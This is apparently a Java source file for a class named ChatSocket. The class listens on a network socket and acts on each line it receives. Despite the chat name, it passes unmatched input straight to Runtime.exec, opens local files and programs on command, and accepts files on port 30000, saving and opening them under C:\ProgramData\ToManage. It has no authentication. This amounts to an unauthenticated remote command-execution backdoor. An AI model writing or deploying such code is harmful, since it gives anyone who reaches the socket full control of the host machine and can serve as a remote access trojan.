import java.awt.*;
import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Arrays;


/**
 * @author XingYuan Guo
 */
public class ChatSocket extends Thread{

    private final int MODE_CODE_FILE = 1;
    private final int MODE_CODE_DEMAND = 0;
    private final int MODE_CODE_DELIVER = 2;

    Socket socket;
    public ChatSocket(Socket socket) {
        this.socket=socket;
    }

    @Override
    public void run() {
        try{
            InputStream is = socket.getInputStream();
            InputStreamReader isr = new InputStreamReader(is);
            BufferedReader bf = new BufferedReader(isr);
            String demand;
            while ((demand = bf.readLine()) != null) {
                System.out.println(demand);
                if (demand.contains("file")){
                    String fileName = demand.replace("file","").trim();
                    System.out.println(fileName);
                    openFile(fileName);
                }else if (demand.contains("exe")&&!(demand.contains("taskkill"))){
                    System.out.println(demand);
                    openFile(demand);
                }else if ("deliver".equals(demand)){
                    receiveImage();
                }else{
                    Runtime runtime = Runtime.getRuntime();
                    runtime.exec(demand);
                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }

    }
    public  void openFile(String fileName) {
        if (Desktop.isDesktopSupported()){
            Desktop desktop = Desktop.getDesktop();
            File file = new File(fileName);
            try {
                if (file.exists()){
                    desktop.open(file);
                }else{
                    throw new IllegalArgumentException("文件不存在");
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

    }

    private final String myImagePath = "C:\\ProgramData\\ToManage\\";
    public void receiveImage(){

        File folder = new File(myImagePath);
        if (!folder.exists()){
            boolean b = folder.mkdir();
            System.out.println(b);
        }
            try {
                ServerSocket serverSocket = new ServerSocket(30000);
                Socket imageSocket = serverSocket.accept();
                InputStream is = imageSocket.getInputStream();
                OutputStream os;
                    os = new FileOutputStream(myImagePath+"photo.jpg");
                    byte[] byteStr = new byte[1024];
                    int len = 0;
                    while ((len = is.read(byteStr)) > 0) {
                        os.write(byteStr,0,len);
                    }
                    is.close();
                    os.flush();
                    os.close();
                    openFile(myImagePath+"photo.jpg");
                    serverSocket.close();
                    imageSocket.close();
        }catch (IOException e){
                e.printStackTrace();
            }
    }
}